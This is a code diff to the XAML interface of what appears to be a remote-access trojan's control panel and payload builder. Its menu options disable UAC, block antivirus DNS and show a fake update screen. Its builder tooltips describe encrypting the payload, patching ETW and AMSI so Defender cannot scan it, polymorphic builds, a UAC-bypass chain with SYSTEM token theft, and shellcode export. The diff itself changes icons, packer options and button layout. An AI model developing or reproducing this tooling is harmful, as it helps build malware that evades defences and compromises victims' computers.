@@ -2143,7 +2143,7 @@
                                                 <MenuItem x:Name="MenuItemBlockAvDns"      Header="Block AV DNS"        Click="QuickBlockAvDns_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Forbid.svg'}"        Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                                 <MenuItem x:Name="MenuItemBlockWSReset"    Header="Block WSReset"       Click="QuickBlockReset_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Rollback.svg'}"     Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                                 <MenuItem x:Name="MenuItemDisableUac"      Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_Unlock.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
-                                                <MenuItem x:Name="MenuItemFakeUpdate"      Header="Fake Update Screen"  Click="FakeUpdate_Click">        <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Clock.svg'}"             Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem x:Name="MenuItemFakeUpdate"      Header="Fake Update Screen"  Click="FakeUpdate_Click">        <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Download.svg'}"          Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                                 <Separator/>
                                                 <MenuItem x:Name="MenuItemBotKiller"       Header="Run BotKiller"       Click="BotKiller_Click" ToolTip="Kill unsigned random-name processes"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Skull.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                             </MenuItem>
@@ -2745,8 +2745,6 @@
                                                   ToolTip="Wraps the stub in a native C++ loader that: (1) compresses with LZNT1, (2) encrypts with AES-256-CBC using a random per-build key split across 3 binary locations, (3) patches ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) in memory before executing the stub so Defender cannot scan it. Polymorphic: random key, random function names, random junk code, unique BuildId GUID per build." />
                                         <CheckBox x:Name="BldUacBypass" Content="UAC Bypass + SYSTEM elevation (fodhelper chain) — closed-source" Style="{StaticResource SChk}"
                                                   ToolTip="Step 1 ? UAC Bypass: tries a chain of methods silently without showing a UAC prompt (SilentCleanup task hijack ? fodhelper ms-settings ? sdclt ? computerdefaults ? mmc). Step 2 ? SYSTEM elevation: once admin, acquires SeDebugPrivilege, duplicates the token from winlogon.exe, and relaunches the stub as SYSTEM." />
-                                        <CheckBox x:Name="BldUpx" Content="UPX compression (upx.exe must be in PATH or tools/)" Style="{StaticResource SChk}"
-                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces ~8 MB ? ~3.5 MB. Requires upx.exe in PATH or in the tools/ folder next to SeroServer.exe." />
                                         <Border Margin="18,2,0,0" Padding="8,5"
                                                 Background="#1AF59E0B" BorderBrush="#60F59E0B"
                                                 BorderThickness="1" CornerRadius="5"
@@ -2754,6 +2752,11 @@
                                             <TextBlock x:Name="BldTxtUacWarning" FontSize="10" Foreground="#F59E0B" TextWrapping="Wrap"
                                                        Text="?  UAC bypass uses the native C++ loader ? the crypter will be applied automatically." />
                                         </Border>
+                                        <CheckBox x:Name="BldCustomPacker" Style="{StaticResource SChk}" IsEnabled="False" Margin="0,4,0,0"
+                                                  ToolTip="Custom packer — coming soon">
+                                            <TextBlock x:Name="BldTxtCustomPacker" Text="Custom Packer (coming soon)" FontSize="11"
+                                                       Foreground="{DynamicResource LabelBrush}"/>
+                                        </CheckBox>
                                     </StackPanel>
                                 </Border>
 
@@ -2839,24 +2842,24 @@
                                             <TextBlock Text="Delay (ms):" Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" Margin="0,0,8,0" />
                                             <TextBox x:Name="BldReconnectDelay" Style="{StaticResource STxt}" Width="70" Text="5000" />
                                         </StackPanel>
-                                        <StackPanel Orientation="Horizontal">
-                                            <Button x:Name="BtnBuild" Width="120" Height="30"
-                                                    Style="{StaticResource SGreenBtn}" Click="Build_Click">
+                                        <WrapPanel Orientation="Horizontal">
+                                            <Button x:Name="BtnBuild" Width="110" Height="28"
+                                                    Style="{StaticResource SGreenBtn}" Click="Build_Click" Margin="0,0,6,4">
                                                 <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Project.svg'}" Width="14" Height="14" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Project.svg'}" Width="13" Height="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                                                     <TextBlock x:Name="TxtBtnBuild" Text="BUILD" VerticalAlignment="Center"/>
                                                 </StackPanel>
                                             </Button>
-                                            <Button x:Name="BtnBldSave"     Content="SAVE"      Width="70" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
-                                            <Button x:Name="BtnBldCheckAll" Content="CHECK ALL" Width="96" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
-                                            <Button x:Name="BtnExportShellcode" Width="120" Height="30" Margin="8,0,0,0"
+                                            <Button x:Name="BtnBldSave"     Content="SAVE"      Width="64"  Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
+                                            <Button x:Name="BtnBldCheckAll" Content="CHECK ALL" Width="88"  Height="28" Margin="0,0,6,4" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
+                                            <Button x:Name="BtnExportShellcode" Height="28" Margin="0,0,0,4"
                                                     Style="{StaticResource SBtn}" Click="ExportShellcode_Click">
                                                 <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Export.svg'}" Width="14" Height="14" Margin="0,0,6,0" VerticalAlignment="Center"/>
+                                                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Export.svg'}" Width="13" Height="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                                                     <TextBlock x:Name="TxtBtnShellcode" Text="SHELLCODE" VerticalAlignment="Center"/>
                                                 </StackPanel>
                                             </Button>
-                                        </StackPanel>
+                                        </WrapPanel>
                                         <TextBlock x:Name="TxtBuildStatus" Text="" Foreground="{DynamicResource LabelBrush}"
                                                    FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,12,0,0" />
                                     </StackPanel>
